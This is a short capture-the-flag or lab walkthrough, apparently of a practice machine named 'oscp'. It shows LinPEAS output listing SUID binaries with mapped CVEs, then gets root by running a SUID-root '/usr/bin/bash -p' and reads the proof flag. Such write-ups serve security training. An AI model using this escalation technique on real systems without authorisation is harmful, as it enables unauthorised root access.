             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------\
    |                             Do you like PEASS?                            |
    |---------------------------------------------------------------------------| 
    |         Get latest LinPEAS  :     https://github.com/sponsors/carlospolop |
    |         Follow on Twitter   :     @carlospolopm                           |
    |         Respect on HTB      :     SirBroccoli                             |
    |---------------------------------------------------------------------------|
    |                                 Thank you!                                |
    \---------------------------------------------------------------------------/
          linpeas-ng by carlospolop

ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.

Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
 LEGEND:
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...

````````
linpeas find an interesting SUID binary `` /usr/bin/bash `

````````python
═════════════════════════════════════════╣ Interesting Files ╠═════════════════════════════════════════
                                         ╚═══════════════════╝
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
strings Not Found
-rwsr-xr-x 1 root root 109K Jul 29  2020 /snap/snapd/8790/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-xr-x 1 root root 109K Jun  5  2020 /snap/snapd/8140/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-xr-x 1 root root 43K Mar  5  2020 /snap/core18/1885/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 63K Jun 28  2019 /snap/core18/1885/bin/ping
-rwsr-xr-x 1 root root 44K Mar 22  2019 /snap/core18/1885/bin/su
-rwsr-xr-x 1 root root 27K Mar  5  2020 /snap/core18/1885/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 75K Mar 22  2019 /snap/core18/1885/usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 44K Mar 22  2019 /snap/core18/1885/usr/bin/chsh
-rwsr-xr-x 1 root root 75K Mar 22  2019 /snap/core18/1885/usr/bin/gpasswd
-rwsr-xr-x 1 root root 40K Mar 22  2019 /snap/core18/1885/usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 59K Mar 22  2019 /snap/core18/1885/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 146K Jan 31  2020 /snap/core18/1885/usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-- 1 root systemd-resolve 42K Jun 11  2020 /snap/core18/1885/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 427K Mar  4  2019 /snap/core18/1885/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 43K Mar  5  2020 /snap/core18/1754/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 63K Jun 28  2019 /snap/core18/1754/bin/ping
-rwsr-xr-x 1 root root 44K Mar 22  2019 /snap/core18/1754/bin/su
-rwsr-xr-x 1 root root 27K Mar  5  2020 /snap/core18/1754/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 75K Mar 22  2019 /snap/core18/1754/usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 44K Mar 22  2019 /snap/core18/1754/usr/bin/chsh
-rwsr-xr-x 1 root root 75K Mar 22  2019 /snap/core18/1754/usr/bin/gpasswd
-rwsr-xr-x 1 root root 40K Mar 22  2019 /snap/core18/1754/usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 59K Mar 22  2019 /snap/core18/1754/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 146K Jan 31  2020 /snap/core18/1754/usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-- 1 root systemd-resolve 42K Jun 10  2019 /snap/core18/1754/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 427K Mar  4  2019 /snap/core18/1754/usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 51K Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 128K Jun  5  2020 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-xr-x 1 root root 15K Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 23K Aug 16  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 463K May 29  2020 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 87K May 28  2020 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 55K Apr  2  2020 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 39K Mar  7  2020 /usr/bin/fusermount
-rwsr-xr-x 1 root root 67K May 28  2020 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 44K May 28  2020 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-sr-x 1 daemon daemon 55K Nov 12  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-x 1 root root 163K Feb  3  2020 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 84K May 28  2020 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-sr-x 1 root root 1.2M Feb 25  2020 /usr/bin/bash
-rwsr-xr-x 1 root root 31K Aug 16  2019 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
-rwsr-xr-x 1 root root 39K Apr  2  2020 /usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 52K May 28  2020 /usr/bin/chsh
-rwsr-xr-x 1 root root 67K Apr  2  2020 /usr/bin/su

````````
we can take advantage of this binary and become root.

````````bash
(remote) oscp@oscp:/home/oscp$ /usr/bin/bash -p
(remote) root@oscp:/home/oscp# id
uid=1000(oscp) gid=1000(oscp) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd),1000(oscp)
(remote) root@oscp:/home/oscp# whoami
root
(remote) root@oscp:/home/oscp# cd /root
(remote) root@oscp:/root# ls
fix-wordpress  flag.txt  proof.txt  snap
(remote) root@oscp:/root# cat proof.txt 
ca2c42415bf4789b8bbc76c5dd9e8464
(remote) root@oscp:/root# 

```````` 

Now we own the system.

- DONE